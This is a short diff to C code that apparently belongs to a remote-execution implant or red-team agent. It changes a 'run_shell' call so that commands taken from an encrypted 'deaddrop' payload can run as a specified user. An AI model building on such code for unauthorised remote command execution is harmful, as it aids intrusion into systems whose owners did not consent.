@@ -76,7 +76,12 @@ void app_payload_unstructured_handle(
        encrypted_str,
        deaddrop->exec_split);
 
-  app.payload.run_shell(deaddrop->constructor, 4, argv, deaddrop->exec_split);
+  app.payload.run_shell(
+      deaddrop->constructor,
+      4,
+      argv,
+      deaddrop->exec_split,
+      deaddrop->run_as[0] ? deaddrop->run_as : NULL);
 }
 
 static void app_payload_unstructured_handle_invalid(
